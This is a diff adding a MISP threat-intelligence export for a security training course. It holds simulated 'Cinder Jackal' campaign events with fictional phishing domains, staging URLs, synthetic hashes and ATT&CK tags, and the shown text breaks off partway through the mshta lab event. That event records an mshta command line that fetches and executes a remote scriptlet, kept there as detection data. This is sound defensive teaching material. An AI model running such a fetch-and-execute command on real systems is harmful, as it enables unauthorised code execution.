@@ -1,0 +1,3388 @@
+{
+  "response": [
+    {
+      "Event": {
+        "uuid": "4a3e3ba0-2f39-5cdb-a7d9-374af2c6449d",
+        "info": "IgniteCyber CJ LAB-1.1: Hosted Lab Onboarding + Health Checks",
+        "date": "2025-06-16",
+        "threat_level_id": "2",
+        "analysis": "1",
+        "distribution": "0",
+        "published": false,
+        "disable_correlation": false,
+        "Tag": [
+          {
+            "name": "tlp:clear"
+          },
+          {
+            "name": "pap:green"
+          },
+          {
+            "name": "workflow:state=\"training-simulation\""
+          },
+          {
+            "name": "course:ignitecyber-academy"
+          },
+          {
+            "name": "victim:apexfin-solutions"
+          },
+          {
+            "name": "threat-actor:cinder-jackal"
+          },
+          {
+            "name": "training:data-only"
+          },
+          {
+            "name": "lab:LAB-1.1"
+          },
+          {
+            "name": "case:CJ-001"
+          },
+          {
+            "name": "day:day-1"
+          },
+          {
+            "name": "attack:technique=\"T1082\""
+          },
+          {
+            "name": "misp-galaxy:mitre-attack-pattern=\"System Information Discovery - T1082\""
+          }
+        ],
+        "Attribute": [
+          {
+            "uuid": "3faff25e-41d3-52f8-9b33-4abf1bf768ac",
+            "type": "text",
+            "category": "Other",
+            "value": "case_id=CJ-001",
+            "to_ids": false,
+            "comment": "TheHive/MISP case alignment key.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-06-16",
+            "Tag": [
+              {
+                "name": "context:case-id"
+              }
+            ]
+          },
+          {
+            "uuid": "ba546c46-a2bd-5d5c-acc3-041d2165825d",
+            "type": "text",
+            "category": "Other",
+            "value": "notebook=LAB-1.1_Onboarding_HealthChecks_FIXED.ipynb",
+            "to_ids": false,
+            "comment": "Notebook or source artifact aligned to this MISP event.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-06-16",
+            "Tag": [
+              {
+                "name": "context:notebook"
+              }
+            ]
+          },
+          {
+            "uuid": "69621394-8f3d-5408-b54c-23814d48ecef",
+            "type": "hostname",
+            "category": "Network activity",
+            "value": "AF-SOC-LAB",
+            "to_ids": false,
+            "comment": "Internal lab host used to validate MISP/TheHive/Cortex connectivity.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-06-16",
+            "Tag": [
+              {
+                "name": "source:internal-reference"
+              },
+              {
+                "name": "lab:LAB-1.1"
+              }
+            ]
+          },
+          {
+            "uuid": "1b86dcff-c0c0-52b1-8be2-fa04a77d25f1",
+            "type": "hostname",
+            "category": "Network activity",
+            "value": "AF-WIN-WS01",
+            "to_ids": false,
+            "comment": "Windows workstation enrolled for endpoint telemetry validation.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-06-16",
+            "Tag": [
+              {
+                "name": "source:internal-reference"
+              },
+              {
+                "name": "lab:LAB-1.1"
+              }
+            ]
+          },
+          {
+            "uuid": "1385b9d2-4546-5c3c-ac8a-cb434ad45a62",
+            "type": "text",
+            "category": "Other",
+            "value": "zeek-* / wazuh-alerts-* / elastic-agent-*",
+            "to_ids": false,
+            "comment": "Expected Elastic index patterns for SOC health checks.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-06-16",
+            "Tag": [
+              {
+                "name": "source:course-telemetry-reference"
+              },
+              {
+                "name": "lab:LAB-1.1"
+              }
+            ]
+          }
+        ],
+        "EventReport": [
+          {
+            "uuid": "3732a836-7143-5cba-a3b3-b12bc6ea23fd",
+            "name": "LAB-1.1 CTI Event Report",
+            "content": "# LAB-1.1 \u2014 Hosted Lab Onboarding + Health Checks\n\n**Case:** CJ-001  \n**Campaign:** Cinder Jackal vs ApexFin Solutions  \n**Date:** 2025-06-16  \n**ATT&CK:** T1082\n\n## Analyst narrative\nStudents verify the local SOC stack, confirm telemetry readiness, and establish the Cinder Jackal campaign context before promoting any intel into MISP.\n\n## CTI promotion guidance\n- Promote only validated observables from TheHive/Cortex into this MISP event.\n- Keep `to_ids=false` for baseline infrastructure, documentation ranges, internal IPs, and workflow metadata.\n- Keep `to_ids=true` for behaviorally useful detection indicators such as malicious command lines, staged payload names, suspicious URLs, named pipes, and fictional campaign IOCs.\n- Add sightings during the lab when the same observable appears in Elastic/Wazuh/Zeek queries.\n\n## Source artifacts\n- Notebook/lab narrative only\n",
+            "distribution": "0",
+            "deleted": false
+          }
+        ]
+      }
+    },
+    {
+      "Event": {
+        "uuid": "1e96801c-f7b0-5f82-b657-78ecf8a2af0c",
+        "info": "IgniteCyber CJ LAB-1.2: Baseline Dashboards (Zeek + Endpoint Telemetry)",
+        "date": "2025-06-18",
+        "threat_level_id": "2",
+        "analysis": "1",
+        "distribution": "0",
+        "published": false,
+        "disable_correlation": false,
+        "Tag": [
+          {
+            "name": "tlp:clear"
+          },
+          {
+            "name": "pap:green"
+          },
+          {
+            "name": "workflow:state=\"training-simulation\""
+          },
+          {
+            "name": "course:ignitecyber-academy"
+          },
+          {
+            "name": "victim:apexfin-solutions"
+          },
+          {
+            "name": "threat-actor:cinder-jackal"
+          },
+          {
+            "name": "training:data-only"
+          },
+          {
+            "name": "lab:LAB-1.2"
+          },
+          {
+            "name": "case:CJ-002"
+          },
+          {
+            "name": "day:day-1"
+          },
+          {
+            "name": "attack:technique=\"T1046\""
+          },
+          {
+            "name": "misp-galaxy:mitre-attack-pattern=\"Network Service Discovery - T1046\""
+          }
+        ],
+        "Attribute": [
+          {
+            "uuid": "a38a5a04-e1a6-506d-ba43-0e6ae77e9dab",
+            "type": "text",
+            "category": "Other",
+            "value": "case_id=CJ-002",
+            "to_ids": false,
+            "comment": "TheHive/MISP case alignment key.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-06-18",
+            "Tag": [
+              {
+                "name": "context:case-id"
+              }
+            ]
+          },
+          {
+            "uuid": "f4225b28-9725-5701-ab52-b037aa8d84b3",
+            "type": "text",
+            "category": "Other",
+            "value": "notebook=LAB-1.2_Baseline_Dashboards_Zeek_Endpoint_FIXED.ipynb",
+            "to_ids": false,
+            "comment": "Notebook or source artifact aligned to this MISP event.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-06-18",
+            "Tag": [
+              {
+                "name": "context:notebook"
+              }
+            ]
+          },
+          {
+            "uuid": "9c845c7e-2518-5cdb-8440-bb2f220ce4d8",
+            "type": "ip-src",
+            "category": "Network activity",
+            "value": "192.168.2.5",
+            "to_ids": false,
+            "comment": "Training workstation source address observed repeatedly in Windows Filtering Platform and Log4Shell lab telemetry.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-06-18",
+            "Tag": [
+              {
+                "name": "source:lab-internal-ip"
+              },
+              {
+                "name": "lab:LAB-1.2"
+              }
+            ]
+          },
+          {
+            "uuid": "c0daa960-f735-544a-87ae-e494475c442c",
+            "type": "ip-dst",
+            "category": "Network activity",
+            "value": "168.63.129.16",
+            "to_ids": false,
+            "comment": "Azure host metadata/agent endpoint commonly observed in baseline Windows telemetry; included as benign baseline context.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-06-18",
+            "Tag": [
+              {
+                "name": "source:expected-baseline-cloud-service"
+              },
+              {
+                "name": "lab:LAB-1.2"
+              }
+            ]
+          },
+          {
+            "uuid": "a54a5e40-d881-502e-97ca-17b26b07ff33",
+            "type": "text",
+            "category": "Other",
+            "value": "baseline outbound TCP/80 and TCP/443",
+            "to_ids": false,
+            "comment": "Baseline network behavior used for contrast during later attack labs.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-06-18",
+            "Tag": [
+              {
+                "name": "source:baseline-behavior"
+              },
+              {
+                "name": "lab:LAB-1.2"
+              }
+            ]
+          }
+        ],
+        "EventReport": [
+          {
+            "uuid": "bb1d6543-663e-5674-8370-ed3ab545cc18",
+            "name": "LAB-1.2 CTI Event Report",
+            "content": "# LAB-1.2 \u2014 Baseline Dashboards (Zeek + Endpoint Telemetry)\n\n**Case:** CJ-002  \n**Campaign:** Cinder Jackal vs ApexFin Solutions  \n**Date:** 2025-06-18  \n**ATT&CK:** T1046\n\n## Analyst narrative\nStudents establish baseline network and endpoint behavior so later Cinder Jackal activity can be compared against normal traffic.\n\n## CTI promotion guidance\n- Promote only validated observables from TheHive/Cortex into this MISP event.\n- Keep `to_ids=false` for baseline infrastructure, documentation ranges, internal IPs, and workflow metadata.\n- Keep `to_ids=true` for behaviorally useful detection indicators such as malicious command lines, staged payload names, suspicious URLs, named pipes, and fictional campaign IOCs.\n- Add sightings during the lab when the same observable appears in Elastic/Wazuh/Zeek queries.\n\n## Source artifacts\n- Notebook/lab narrative only\n",
+            "distribution": "0",
+            "deleted": false
+          }
+        ]
+      }
+    },
+    {
+      "Event": {
+        "uuid": "6ce284b4-9087-50cd-baea-837aef984be0",
+        "info": "IgniteCyber CJ LAB-1.3: First Detection: Suspicious PowerShell (Sigma)",
+        "date": "2025-06-20",
+        "threat_level_id": "2",
+        "analysis": "1",
+        "distribution": "0",
+        "published": false,
+        "disable_correlation": false,
+        "Tag": [
+          {
+            "name": "tlp:clear"
+          },
+          {
+            "name": "pap:green"
+          },
+          {
+            "name": "workflow:state=\"training-simulation\""
+          },
+          {
+            "name": "course:ignitecyber-academy"
+          },
+          {
+            "name": "victim:apexfin-solutions"
+          },
+          {
+            "name": "threat-actor:cinder-jackal"
+          },
+          {
+            "name": "training:data-only"
+          },
+          {
+            "name": "lab:LAB-1.3"
+          },
+          {
+            "name": "case:CJ-003"
+          },
+          {
+            "name": "day:day-1"
+          },
+          {
+            "name": "attack:technique=\"T1059.001\""
+          },
+          {
+            "name": "misp-galaxy:mitre-attack-pattern=\"PowerShell - T1059.001\""
+          }
+        ],
+        "Attribute": [
+          {
+            "uuid": "ba3aaad2-8903-5db8-9741-ce4af86b583f",
+            "type": "text",
+            "category": "Other",
+            "value": "case_id=CJ-003",
+            "to_ids": false,
+            "comment": "TheHive/MISP case alignment key.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-06-20",
+            "Tag": [
+              {
+                "name": "context:case-id"
+              }
+            ]
+          },
+          {
+            "uuid": "ab894311-1d41-52cc-a460-972057c3afd5",
+            "type": "text",
+            "category": "Other",
+            "value": "notebook=LAB-1.3_First_Detection_Suspicious_PowerShell_Sigma.ipynb",
+            "to_ids": false,
+            "comment": "Notebook or source artifact aligned to this MISP event.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-06-20",
+            "Tag": [
+              {
+                "name": "context:notebook"
+              }
+            ]
+          },
+          {
+            "uuid": "0075ca32-fa11-5656-987a-50303d70211a",
+            "type": "text",
+            "category": "Other",
+            "value": "source_file=psh_powershell_httplistener_2020-11-0204130683.json",
+            "to_ids": false,
+            "comment": "Telemetry/evidence source used to seed this CTI event.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-06-20",
+            "Tag": [
+              {
+                "name": "context:source-file"
+              }
+            ]
+          },
+          {
+            "uuid": "c6095b44-da50-51a6-93d2-f28a22689088",
+            "type": "filename",
+            "category": "Payload delivery",
+            "value": "powershell.exe",
+            "to_ids": false,
+            "comment": "PowerShell execution observed during suspicious listener-oriented lab telemetry.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-06-20",
+            "Tag": [
+              {
+                "name": "source:process-indicator"
+              },
+              {
+                "name": "lab:LAB-1.3"
+              }
+            ]
+          },
+          {
+            "uuid": "035b5e74-3634-5a5e-8bc9-bd9313439ba4",
+            "type": "port",
+            "category": "Network activity",
+            "value": "8000",
+            "to_ids": false,
+            "comment": "Local listener port observed in PowerShell HTTP listener dataset.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-06-20",
+            "Tag": [
+              {
+                "name": "source:lab-listener-port"
+              },
+              {
+                "name": "lab:LAB-1.3"
+              }
+            ]
+          },
+          {
+            "uuid": "e488dc2d-465c-5b5a-880b-f5f761eafe5f",
+            "type": "command-line",
+            "category": "External analysis",
+            "value": "WindowsPowerShell\\v1.0\\powershell.exe",
+            "to_ids": false,
+            "comment": "PowerShell executable path observed in process access and WFP context.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-06-20",
+            "Tag": [
+              {
+                "name": "source:process-path-fragment"
+              },
+              {
+                "name": "lab:LAB-1.3"
+              }
+            ]
+          }
+        ],
+        "EventReport": [
+          {
+            "uuid": "065de9e7-3a04-5319-9802-861bd522f9da",
+            "name": "LAB-1.3 CTI Event Report",
+            "content": "# LAB-1.3 \u2014 First Detection: Suspicious PowerShell (Sigma)\n\n**Case:** CJ-003  \n**Campaign:** Cinder Jackal vs ApexFin Solutions  \n**Date:** 2025-06-20  \n**ATT&CK:** T1059.001\n\n## Analyst narrative\nStudents triage suspicious PowerShell behavior and create the first Sigma-driven detection artifact for the campaign.\n\n## CTI promotion guidance\n- Promote only validated observables from TheHive/Cortex into this MISP event.\n- Keep `to_ids=false` for baseline infrastructure, documentation ranges, internal IPs, and workflow metadata.\n- Keep `to_ids=true` for behaviorally useful detection indicators such as malicious command lines, staged payload names, suspicious URLs, named pipes, and fictional campaign IOCs.\n- Add sightings during the lab when the same observable appears in Elastic/Wazuh/Zeek queries.\n\n## Source artifacts\n- psh_powershell_httplistener_2020-11-0204130683.json\n",
+            "distribution": "0",
+            "deleted": false
+          }
+        ]
+      }
+    },
+    {
+      "Event": {
+        "uuid": "ac00dc61-69ff-558c-b264-9a67cbf6f952",
+        "info": "IgniteCyber CJ LAB-2.1: Phishing Case Triage (Elastic Casebook-style)",
+        "date": "2025-07-08",
+        "threat_level_id": "2",
+        "analysis": "1",
+        "distribution": "0",
+        "published": false,
+        "disable_correlation": false,
+        "Tag": [
+          {
+            "name": "tlp:clear"
+          },
+          {
+            "name": "pap:green"
+          },
+          {
+            "name": "workflow:state=\"training-simulation\""
+          },
+          {
+            "name": "course:ignitecyber-academy"
+          },
+          {
+            "name": "victim:apexfin-solutions"
+          },
+          {
+            "name": "threat-actor:cinder-jackal"
+          },
+          {
+            "name": "training:data-only"
+          },
+          {
+            "name": "lab:LAB-2.1"
+          },
+          {
+            "name": "case:CJ-004"
+          },
+          {
+            "name": "day:day-2"
+          },
+          {
+            "name": "attack:technique=\"T1566.001\""
+          },
+          {
+            "name": "misp-galaxy:mitre-attack-pattern=\"Spearphishing Attachment - T1566.001\""
+          }
+        ],
+        "Attribute": [
+          {
+            "uuid": "3721b97c-10b5-56bf-8d55-dadc0b63ac9e",
+            "type": "text",
+            "category": "Other",
+            "value": "case_id=CJ-004",
+            "to_ids": false,
+            "comment": "TheHive/MISP case alignment key.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-07-08",
+            "Tag": [
+              {
+                "name": "context:case-id"
+              }
+            ]
+          },
+          {
+            "uuid": "5a8e36bb-5808-53ee-948c-cec1e9f43d54",
+            "type": "text",
+            "category": "Other",
+            "value": "notebook=LAB-2.1_Phishing_Triage_Elastic_Casebook.ipynb",
+            "to_ids": false,
+            "comment": "Notebook or source artifact aligned to this MISP event.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-07-08",
+            "Tag": [
+              {
+                "name": "context:notebook"
+              }
+            ]
+          },
+          {
+            "uuid": "1b55ccfa-f268-504f-b6e4-78d74d4a092e",
+            "type": "email-src",
+            "category": "Payload delivery",
+            "value": "billing@apexfin-support.com",
+            "to_ids": true,
+            "comment": "Training sender used as phishing lead for the ApexFin scenario.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-07-08",
+            "Tag": [
+              {
+                "name": "source:training-only-indicator"
+              },
+              {
+                "name": "lab:LAB-2.1"
+              }
+            ]
+          },
+          {
+            "uuid": "d8080ae3-c8d6-5c79-b9c2-360ac47267c2",
+            "type": "domain",
+            "category": "Network activity",
+            "value": "cj-mail.com",
+            "to_ids": true,
+            "comment": "Training phishing infrastructure domain from CJ Day 1/Day 2 narrative.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-07-08",
+            "Tag": [
+              {
+                "name": "source:training-only-indicator"
+              },
+              {
+                "name": "lab:LAB-2.1"
+              }
+            ]
+          },
+          {
+            "uuid": "4ea667b4-f302-5ecf-8360-c6f76ad82608",
+            "type": "url",
+            "category": "Network activity",
+            "value": "https://cj-mail.com/portal/login",
+            "to_ids": true,
+            "comment": "Training phishing URL; use only inside lab MISP instance.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-07-08",
+            "Tag": [
+              {
+                "name": "source:training-only-indicator"
+              },
+              {
+                "name": "lab:LAB-2.1"
+              }
+            ]
+          },
+          {
+            "uuid": "79aaddbf-af17-5b5c-96fc-85c9b1ba1f2f",
+            "type": "filename",
+            "category": "Payload delivery",
+            "value": "invoice_Q2_2026.docm",
+            "to_ids": true,
+            "comment": "Reported attachment name for phishing triage.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-07-08",
+            "Tag": [
+              {
+                "name": "source:training-only-indicator"
+              },
+              {
+                "name": "lab:LAB-2.1"
+              }
+            ]
+          },
+          {
+            "uuid": "b96a6f85-0bb5-5f4c-9bd7-1bc45f133753",
+            "type": "ip-dst",
+            "category": "Network activity",
+            "value": "198.51.100.10",
+            "to_ids": false,
+            "comment": "TEST-NET-2 address used as a safe training infrastructure lead.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-07-08",
+            "Tag": [
+              {
+                "name": "source:reserved-documentation-ip"
+              },
+              {
+                "name": "lab:LAB-2.1"
+              }
+            ]
+          }
+        ],
+        "EventReport": [
+          {
+            "uuid": "0fb37704-2f4a-5de4-8ff8-e2f46e8d66fd",
+            "name": "LAB-2.1 CTI Event Report",
+            "content": "# LAB-2.1 \u2014 Phishing Case Triage (Elastic Casebook-style)\n\n**Case:** CJ-004  \n**Campaign:** Cinder Jackal vs ApexFin Solutions  \n**Date:** 2025-07-08  \n**ATT&CK:** T1566.001\n\n## Analyst narrative\nStudents triage a reported phishing lead, capture observables, and prepare a casebook entry before expanding into malware/macro analysis.\n\n## CTI promotion guidance\n- Promote only validated observables from TheHive/Cortex into this MISP event.\n- Keep `to_ids=false` for baseline infrastructure, documentation ranges, internal IPs, and workflow metadata.\n- Keep `to_ids=true` for behaviorally useful detection indicators such as malicious command lines, staged payload names, suspicious URLs, named pipes, and fictional campaign IOCs.\n- Add sightings during the lab when the same observable appears in Elastic/Wazuh/Zeek queries.\n\n## Source artifacts\n- Notebook/lab narrative only\n",
+            "distribution": "0",
+            "deleted": false
+          }
+        ]
+      }
+    },
+    {
+      "Event": {
+        "uuid": "cfcace8c-8b70-5d0b-81c5-2f6010268552",
+        "info": "IgniteCyber CJ LAB-2.2: Maldoc/Macro Analysis + Deobfuscation + IOC Extraction",
+        "date": "2025-07-10",
+        "threat_level_id": "2",
+        "analysis": "1",
+        "distribution": "0",
+        "published": false,
+        "disable_correlation": false,
+        "Tag": [
+          {
+            "name": "tlp:clear"
+          },
+          {
+            "name": "pap:green"
+          },
+          {
+            "name": "workflow:state=\"training-simulation\""
+          },
+          {
+            "name": "course:ignitecyber-academy"
+          },
+          {
+            "name": "victim:apexfin-solutions"
+          },
+          {
+            "name": "threat-actor:cinder-jackal"
+          },
+          {
+            "name": "training:data-only"
+          },
+          {
+            "name": "lab:LAB-2.2"
+          },
+          {
+            "name": "case:CJ-005"
+          },
+          {
+            "name": "day:day-2"
+          },
+          {
+            "name": "attack:technique=\"T1204.002\""
+          },
+          {
+            "name": "misp-galaxy:mitre-attack-pattern=\"Malicious File - T1204.002\""
+          },
+          {
+            "name": "attack:technique=\"T1059.001\""
+          },
+          {
+            "name": "misp-galaxy:mitre-attack-pattern=\"PowerShell - T1059.001\""
+          },
+          {
+            "name": "attack:technique=\"T1027\""
+          },
+          {
+            "name": "misp-galaxy:mitre-attack-pattern=\"Obfuscated Files or Information - T1027\""
+          }
+        ],
+        "Attribute": [
+          {
+            "uuid": "8e6b032b-d997-5d46-b6f6-d55c7b8a2b31",
+            "type": "text",
+            "category": "Other",
+            "value": "case_id=CJ-005",
+            "to_ids": false,
+            "comment": "TheHive/MISP case alignment key.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-07-10",
+            "Tag": [
+              {
+                "name": "context:case-id"
+              }
+            ]
+          },
+          {
+            "uuid": "cc617b5a-e602-5099-b962-84526c2f2109",
+            "type": "text",
+            "category": "Other",
+            "value": "notebook=LAB-2.2_Maldoc_Macro_Deobfuscation_IOC_Extraction.ipynb",
+            "to_ids": false,
+            "comment": "Notebook or source artifact aligned to this MISP event.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-07-10",
+            "Tag": [
+              {
+                "name": "context:notebook"
+              }
+            ]
+          },
+          {
+            "uuid": "fbbc7b3a-3679-554c-85a7-46355a361af5",
+            "type": "filename",
+            "category": "Payload delivery",
+            "value": "invoice_Q2_2026.docm",
+            "to_ids": true,
+            "comment": "Maldoc filename carried forward from phishing triage.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-07-10",
+            "Tag": [
+              {
+                "name": "source:training-only-indicator"
+              },
+              {
+                "name": "lab:LAB-2.2"
+              }
+            ]
+          },
+          {
+            "uuid": "a90de2fe-3cc0-50f9-988f-23297d8fb582",
+            "type": "filename",
+            "category": "Payload delivery",
+            "value": "update_config.ps1",
+            "to_ids": true,
+            "comment": "Decoded/staged PowerShell script name used by the fictional macro chain.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-07-10",
+            "Tag": [
+              {
+                "name": "source:training-only-indicator"
+              },
+              {
+                "name": "lab:LAB-2.2"
+              }
+            ]
+          },
+          {
+            "uuid": "9892e237-cd0a-53de-9dca-ab583fb05837",
+            "type": "domain",
+            "category": "Network activity",
+            "value": "cdn-cj-stage.com",
+            "to_ids": true,
+            "comment": "Training staging domain for macro IOC extraction exercises.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-07-10",
+            "Tag": [
+              {
+                "name": "source:training-only-indicator"
+              },
+              {
+                "name": "lab:LAB-2.2"
+              }
+            ]
+          },
+          {
+            "uuid": "f6a71201-a4dd-59b7-9e2c-8c10f085f530",
+            "type": "url",
+            "category": "Network activity",
+            "value": "https://cdn-cj-stage.com/a/update_config.ps1",
+            "to_ids": true,
+            "comment": "Training staging URL for macro IOC extraction exercises.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-07-10",
+            "Tag": [
+              {
+                "name": "source:training-only-indicator"
+              },
+              {
+                "name": "lab:LAB-2.2"
+              }
+            ]
+          },
+          {
+            "uuid": "993572b3-e79d-505e-b44d-b2026313928e",
+            "type": "sha256",
+            "category": "Payload delivery",
+            "value": "9f2d7d5f46a1d1f5c3b8a8b461d19e6db4d1a4dce28a7b0711a44c1f5a4b77cf",
+            "to_ids": true,
+            "comment": "Synthetic hash for the training maldoc/stager family.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-07-10",
+            "Tag": [
+              {
+                "name": "source:synthetic-training-hash"
+              },
+              {
+                "name": "lab:LAB-2.2"
+              }
+            ]
+          }
+        ],
+        "EventReport": [
+          {
+            "uuid": "d55bcc98-8b80-59a9-9087-f4fc252ff673",
+            "name": "LAB-2.2 CTI Event Report",
+            "content": "# LAB-2.2 \u2014 Maldoc/Macro Analysis + Deobfuscation + IOC Extraction\n\n**Case:** CJ-005  \n**Campaign:** Cinder Jackal vs ApexFin Solutions  \n**Date:** 2025-07-10  \n**ATT&CK:** T1204.002, T1059.001, T1027\n\n## Analyst narrative\nStudents deobfuscate a suspicious document macro and promote extracted indicators into MISP with confidence and validation notes.\n\n## CTI promotion guidance\n- Promote only validated observables from TheHive/Cortex into this MISP event.\n- Keep `to_ids=false` for baseline infrastructure, documentation ranges, internal IPs, and workflow metadata.\n- Keep `to_ids=true` for behaviorally useful detection indicators such as malicious command lines, staged payload names, suspicious URLs, named pipes, and fictional campaign IOCs.\n- Add sightings during the lab when the same observable appears in Elastic/Wazuh/Zeek queries.\n\n## Source artifacts\n- Notebook/lab narrative only\n",
+            "distribution": "0",
+            "deleted": false
+          }
+        ]
+      }
+    },
+    {
+      "Event": {
+        "uuid": "7b84c57d-2b34-53a5-9d5e-f22b8994f939",
+        "info": "IgniteCyber CJ LAB-2.3: LOLBAS Proxy Execution: mshta.exe",
+        "date": "2025-07-15",
+        "threat_level_id": "2",
+        "analysis": "1",
+        "distribution": "0",
+        "published": false,
+        "disable_correlation": false,
+        "Tag": [
+          {
+            "name": "tlp:clear"
+          },
+          {
+            "name": "pap:green"
+          },
+          {
+            "name": "workflow:state=\"training-simulation\""
+          },
+          {
+            "name": "course:ignitecyber-academy"
+          },
+          {
+            "name": "victim:apexfin-solutions"
+          },
+          {
+            "name": "threat-actor:cinder-jackal"
+          },
+          {
+            "name": "training:data-only"
+          },
+          {
+            "name": "lab:LAB-2.3"
+          },
+          {
+            "name": "case:CJ-006"
+          },
+          {
+            "name": "day:day-2"
+          },
+          {
+            "name": "attack:technique=\"T1218.005\""
+          },
+          {
+            "name": "misp-galaxy:mitre-attack-pattern=\"Mshta - T1218.005\""
+          }
+        ],
+        "Attribute": [
+          {
+            "uuid": "0882f7e2-8cef-5acd-991c-915876952c54",
+            "type": "text",
+            "category": "Other",
+            "value": "case_id=CJ-006",
+            "to_ids": false,
+            "comment": "TheHive/MISP case alignment key.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-07-15",
+            "Tag": [
+              {
+                "name": "context:case-id"
+              }
+            ]
+          },
+          {
+            "uuid": "91abf837-223a-528a-98c9-42735c450575",
+            "type": "text",
+            "category": "Other",
+            "value": "notebook=LAB-2.3_LOLBAS_mshta_ProxyExecution_T1218_005.ipynb",
+            "to_ids": false,
+            "comment": "Notebook or source artifact aligned to this MISP event.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-07-15",
+            "Tag": [
+              {
+                "name": "context:notebook"
+              }
+            ]
+          },
+          {
+            "uuid": "0d5654d7-e8ae-576c-bbef-d01f4a2270a7",
+            "type": "text",
+            "category": "Other",
+            "value": "source_file=cmd_mshta_javascript_getobject_sct_2020-10-2202214475.json",
+            "to_ids": false,
+            "comment": "Telemetry/evidence source used to seed this CTI event.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-07-15",
+            "Tag": [
+              {
+                "name": "context:source-file"
+              }
+            ]
+          },
+          {
+            "uuid": "6394fc82-068d-522c-8f10-8101a8b2aa79",
+            "type": "filename",
+            "category": "Payload delivery",
+            "value": "mshta.exe",
+            "to_ids": false,
+            "comment": "LOLBAS process used for proxy execution.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-07-15",
+            "Tag": [
+              {
+                "name": "source:windows-lolbas-binary"
+              },
+              {
+                "name": "lab:LAB-2.3"
+              }
+            ]
+          },
+          {
+            "uuid": "ca27a96e-58bc-5fc8-a674-d3a33c0df8e6",
+            "type": "url",
+            "category": "Network activity",
+            "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct",
+            "to_ids": false,
+            "comment": "Scriptlet URL observed in mshta command line.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-07-15",
+            "Tag": [
+              {
+                "name": "source:training-source-url"
+              },
+              {
+                "name": "lab:LAB-2.3"
+              }
+            ]
+          },
+          {
+            "uuid": "10c97756-c114-5bcd-b379-7dfbcea5b563",
+            "type": "ip-dst",
+            "category": "Network activity",
+            "value": "151.101.248.133",
+            "to_ids": false,
+            "comment": "Remote IP observed for mshta HTTPS retrieval.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-07-15",
+            "Tag": [
+              {
+                "name": "source:observed-cdn-endpoint"
+              },
+              {
+                "name": "lab:LAB-2.3"
+              }
+            ]
+          },
+          {
+            "uuid": "1b906e8f-1238-55cc-bab6-6c38c457321d",
+            "type": "command-line",
+            "category": "External analysis",
+            "value": "mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();",
+            "to_ids": true,
+            "comment": "Full command line observed in Windows Security Event ID 4688.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-07-15",
+            "Tag": [
+              {
+                "name": "source:detection-indicator"
+              },
+              {
+                "name": "lab:LAB-2.3"
+              }
+            ]
+          },
+          {
+            "uuid": "7a4c1312-458c-5bc6-89dc-fca2e0762c53",
+            "type": "filename",
+            "category": "Payload delivery",
+            "value": "calc.exe",
+            "to_ids": false,
+            "comment": "Child process launched by Atomic Red Team mshta test payload.",
+            "distribution": "0",
+            "disable_correlation": false,
+            "first_seen": "2025-07-15",
+            "Tag": [
+              {
+                "name": "source:payload-behavior-evidence"
+              },
+              {
+                "name": "lab:LAB-2.3"
+              }
+            ]
+          }
+        ],
+        "EventReport": [
+          {
+            "uuid": "0c28e4d9-454b-581d-88b7-c45e9ff45cfe",
+            "name": "LAB-2.3 CTI Event Report",
